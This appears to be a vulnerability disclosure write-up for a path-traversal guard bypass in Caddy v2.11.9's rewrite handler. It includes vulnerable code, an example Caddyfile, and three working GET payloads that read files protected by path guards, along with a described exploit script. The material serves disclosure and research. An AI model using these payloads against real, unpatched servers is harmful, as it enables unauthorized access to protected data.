# CaddyWormhole — path-guard bypass in Caddy's `rewrite` handler (0-day in v2.11.9)

| | |
|---|---|
| Product + version | **Caddy** v2.11.9 (and earlier) — `github.com/caddyserver/caddy`, commit `0d98caea58f794f88e709b1bef2880996a471bca` |
| CVSS | **7.5 High** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| CWE | **CWE-22** (Path Traversal) / CWE-863 (Incorrect Authorization) / CWE-436 (Interpretation Conflict) |

**Fix:** commit `fc6c202ea60dd34aacfcb201403c8561f56da905` — *"rewrite: canonicalize paths
after substring and regexp replacement"* (2026-11-10, Matthew Holt; part of a cluster of
path-handling hardening commits). **Unreleased** as of 2026-11-12: the latest public release
`v2.11.9` (2026-11-05) predates it, so v2.11.9 is 0-day-vulnerable.

## The bug

Caddy's `rewrite` handler has several path mutators. `strip_path_prefix`/`strip_path_suffix`
canonicalize the result they produce, but `uri_substring` (`uri replace <find> <replace>`) and
`path_regexp` (`uri path_regexp <find> <replace>`) did **not** — until `fc6c202ea6`. Stripping a
prefix such as `/mount` from a request path like `/mount../secret/flag.txt` yields the *relative*
path `../secret/flag.txt`, which is handed downstream **un-canonicalized**:

```go
// vulnerable (modules/caddyhttp/rewrite/rewrite.go @ 0d98cae, v2.11.9)
func (rep substrReplacer) do(r *http.Request, repl *caddy.Replacer) {
    ...
    changePath(r, func(pathOrRawPath string) string {
        return strings.Replace(caddyhttp.CleanPath(pathOrRawPath, mergeSlashes), find, replace, lim)
    })
    // NO canonicalizePath(r) here  <-- the bug
    r.URL.RawQuery = strings.Replace(r.URL.RawQuery, find, replace, lim)
}
```

Downstream, two components read the same string and **interpret it differently**:

* `MatchPath` (the `path` matcher, used by `@blocked path /secret/*` guards and `basicauth`
  path scoping) cleans the request path with `path.Clean`. For a **relative** path,
  `path.Clean("../secret/flag.txt")` keeps the leading `..` → `"../secret/flag.txt"`, which does
  **not** match the anchored `/secret/*` pattern — so the guard never fires.
* `file_server` resolves the file through `SanitizedPathJoin`, which anchors the path first:
  `path.Clean("/" + "../secret/flag.txt")` = `/secret/flag.txt` → it serves `root/secret/flag.txt`.

Result: an unauthenticated client reads a file that the `path /secret/*` guard (or `basicauth`)
was supposed to protect, with a single crafted GET.

## The exploit (real, end-to-end)

A Caddyfile like this is the vulnerable pattern (rewrite before the guard, then `file_server`):

```
http://127.0.0.1:PORT {
    root * /srv/www
    uri replace /mount ""          # vulnerable uri_substring rewrite
    @blocked path /secret/*
    respond @blocked "Forbidden" 403
    file_server
}
```

| request | vulnerable v2.11.9 | fixed master |
|---|---|---|
| `GET /secret/flag.txt` (direct) | **403** (guard fires) | 403 |
| `GET /mount../secret/flag.txt` | **200 + SECRET-FLAG** (bypass) | 403 |
| `GET /mount..%2fsecret/flag.txt` | **200 + SECRET-FLAG** (bypass) | 403 |
| `GET /mount%2e%2e/secret/flag.txt` | **200 + SECRET-FLAG** (bypass) | 403 |
| `GET /public/hello.txt` (control) | 200 | 200 |

The exploit builds the **real** `cmd/caddy` binary at the vulnerable tag and at fixed master, runs
each as a real HTTP server, and drives them with these requests. The vulnerable binary serves the
secret on all three traversal payloads; the fixed binary refuses them all.

## Run it

```
bash run.sh
```

`run.sh` builds the two binaries on first run (`build.sh`, caches under
`/home/millie/tmp/aivr-caddy`) and then runs `exploit.py`, which stages the files, starts the real
Caddy servers, sends the requests, and prints `RESULT: CaddyWormhole EXPLOITED` on success.

## Threat model / scope

* Precondition is a **common, documented configuration**: a `uri replace`/`uri path_regexp`
  rewrite that strips/rewrites a path prefix, followed by a path-scoped guard (`@blocked path`,
  or `basicauth` on a subpath) and `file_server` in the same site.
* The traversal is **confined to the served `root`** — `SanitizedPathJoin` still anchors the path
  to the root, so this is *not* arbitrary filesystem read. Impact = unauthorized disclosure of any
  file inside the root that the guard was meant to protect (admin panels, user data, backups).
* Not a default-on vulnerability — it needs a vulnerable rewrite+guard combination in the config.
